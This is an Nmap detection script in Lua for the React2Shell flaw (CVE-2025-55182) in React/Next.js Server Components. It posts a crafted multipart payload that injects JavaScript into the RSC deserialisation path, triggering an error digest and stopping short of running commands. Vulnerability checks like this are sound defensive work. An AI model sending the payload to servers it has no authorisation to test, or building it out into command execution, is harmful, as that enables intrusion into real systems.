local http = require "http"
local shortport = require "shortport"
local string = require "string"

description = [[
Detection script for React2Shell RCE (CVE-2025-55182) style behavior on React/Next.js apps.

The script sends a crafted React Server Components (RSC) multipart/form-data
request to the root route ("/") and inspects the text/x-component stream
for the presence of a JSON-encoded "digest" field. If a digest is observed,
the target is considered vulnerable to RSC digest exposure and likely affected
by CVE-2025-55182-style issues.

NOTE:
- This checker focuses on detecting the RSC digest behavior, not executing OS
  commands. It is intended for controlled testing environments.
]]

author = "hxorz"
license = "Same as Nmap"
categories = {"vuln", "intrusive"}

-- Lab React2Shell app usually listens on TCP/3000
portrule = shortport.portnumber(3000, "tcp")

action = function(host, port)
  if port.state ~= "open" then
    return
  end

  -- Minimal RSC-shaped payload similar to React2Shell PoC, but without
  -- actually executing OS commands. We only try to trigger a NEXT_REDIRECT
  -- style error path where a digest is returned.
  local payload =
"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" ..
"Content-Disposition: form-data; name=\"0\"\r\n\r\n" ..
"{\"status\":\"resolved_model\",\"_response\":{\"_prefix\":\"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'REACT2SHELL_CHECK'});\"}}\r\n" ..
"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n"

  local options = {
    header = {
      ["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad",
      ["Next-Action"]  = "x",
      ["User-Agent"]   = "nmap-react2shell-check"
    },
    timeout = 8000
  }

  local resp = http.post(host, port, "/", options, payload)
  if not resp then
    return
  end

  local status  = resp.status or 0
  local headers = resp.header or {}
  local body    = resp.body or ""

  local ctype = headers["Content-Type"] or headers["content-type"] or ""
  if not ctype:match("text/x%-component") then
    return
  end

  -- Look for any digest field. In lab PoCs this may be a numeric or string value.
  local digest = body:match('%"digest"%s*:%s*"(.-)"')

  if digest then
    local out = {}
    out[#out+1] = "VULNERABLE: React2Shell-style RSC digest behavior detected (CVE-2025-55182)."
    out[#out+1] = ("HTTP status: %d"):format(status)
    out[#out+1] = ("Content-Type: %s"):format(ctype)
    out[#out+1] = ("Observed digest: %s"):format(digest)
    out[#out+1] = "NOTE: This confirms RSC digest exposure. In a real environment,"
    out[#out+1] = "      exploitability should be further validated with controlled PoCs."

    return table.concat(out, "\n")
  end

  -- No digest -> no output (script stays silent, as is common for Nmap vuln scripts)
  return
end
